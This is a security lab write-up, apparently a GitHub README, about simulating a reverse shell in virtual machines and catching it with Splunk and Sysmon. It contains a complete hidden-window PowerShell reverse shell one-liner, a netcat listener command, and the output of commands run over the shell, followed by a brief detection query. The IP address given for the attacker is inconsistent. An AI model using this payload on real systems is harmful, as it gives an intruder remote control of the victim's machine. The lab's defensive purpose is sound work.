# 🎯 C2 Payload: Reverse Shell Simulation

## Objective
Simulate a basic reverse shell attack from the **Victim (Windows 10)** machine to the **Attacker (Kali)**, and monitor the connection using **Splunk + Sysmon** on the **Defender (Ubuntu)**.

---

## 🧪 Lab Details

| Role     | OS           | IP Address     |
|----------|--------------|----------------|
| Attacker | Kali Linux   | `192.168.0.11` |
| Victim   | Windows 10   | `192.168.0.12` |
| Defender | Ubuntu (Splunk) | `192.168.0.10` |

---

## 🛠️ Payload Used (PowerShell Reverse Shell)

Executed from the **Victim** machine (PowerShell):

```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.13',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```
Note: Defender blocked it initially. Real-time protection was temporarily disabled in Windows Security for testing.

## 🖥️ Kali Listener Setup

On the Attacker machine (Kali):
nc -lvnp 4444

Successfully received incoming shell from Victim:
connect to [192.168.0.13] from (192.168.0.12) 49280
<details>
<summary>🖼️ Session Connection</summary>

![Screenshot 2025-04-25 124346](https://github.com/user-attachments/assets/c15da569-4be4-4ddd-9196-e2b718d1eba4)

</details>



<details>
  <summary>📄 Session Output (Click to Expand)</summary>

**Command:** `whoami`  
**Output:**
victim-win\vboxuser

---

**Command:** `hostname`  
**Output:**
Victim-Win

---

**Command:** `ipconfig`  
**Output:**
Ethernet adapter Ethernet: IPv4 Address. . . . . . . . . . . : 10.0.2.15 Default Gateway . . . . . . . . . : 192.168.0.1

Ethernet adapter Ethernet 2: IPv4 Address. . . . . . . . . . . : 192.168.0.12 Default Gateway . . . . . . . . . : 192.168.0.1

---

**Command:** `systeminfo`  
**Output:**
Host Name:                 VICTIM-WIN
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00329-20000-00001-AA947
Original Install Date:     4/19/2025, 2:30:44 PM
System Boot Time:          4/25/2025, 7:25:04 AM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 151 Stepping 2 GenuineIntel ~3187 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 1,404 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 1,930 MB
Virtual Memory: In Use:    3,574 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\VICTIM-WIN
......

---

**Command:** `dir`  
**Output:**
Mode                 LastWriteTime         Length Name                                                                 
====                 =============         ====== ====                                                                
d-r---         4/19/2025   2:30 PM                3D Objects                                                           
d-r---         4/19/2025   2:30 PM                Contacts                                                             
d-r---         4/22/2025   4:01 PM                Desktop                                                              
d-r---         4/19/2025   2:30 PM                Documents                                                            
d-r---         4/19/2025   7:56 PM                Downloads                                                            
d-r---         4/19/2025   2:30 PM                Favorites                                                            
d-r---         4/19/2025   2:30 PM                Links                                                                
d-r---         4/19/2025   2:30 PM                Music                                                                
d-r---         4/19/2025   2:32 PM                OneDrive                                                             
d-r---         4/19/2025   2:32 PM                Pictures                                                             
d-r---         4/19/2025   2:30 PM                Saved Games                                                          
d-r---         4/19/2025   2:32 PM                Searches                                                             
d-r---         4/19/2025   2:30 PM                Videos           

---

**Command:** `cd Desktop`  
**Command:** `echo You Have been Hacked > hacked.txt`  
<details>
<summary>🖼️ Hacked file</summary>

![Screenshot 2025-04-25 143943](https://github.com/user-attachments/assets/d1c6573f-c40f-4cc7-a46d-9d2b085865c5)

</details>
**Command:** `dir`  
**Output:**
    Directory: C:\Users\vboxuser\Desktop


Mode                 LastWriteTime         Length Name                                                                 
====                ==============         ====== ====                                                                
d-----         4/22/2025   4:05 PM                sysmon-config-master                                                 
-a----         4/25/2025  12:51 PM              0 hacked.txt                                                           
-a----         4/19/2025   4:34 PM           2348 Microsoft Edge.lnk                                                   
-a----         4/19/2025   7:37 PM        1118208 sysmon_logs.evtx      
</details>

## 🔍 Detection via Splunk (EventCode 3)
Logged and verified the following:
```
index=sysmon EventCode=3 DestinationPort=4444
| table _time, Image, User, DestinationIp, DestinationPort
```
✅ Observed PowerShell creating a TCP connection to Kali on port 4444.
<details>
<summary>🖼️ TCP connection Event</summary>

![Screenshot 2025-04-25 140538](https://github.com/user-attachments/assets/28aec82d-ae51-4fc1-9b1f-3031f59ddddb)

</details>



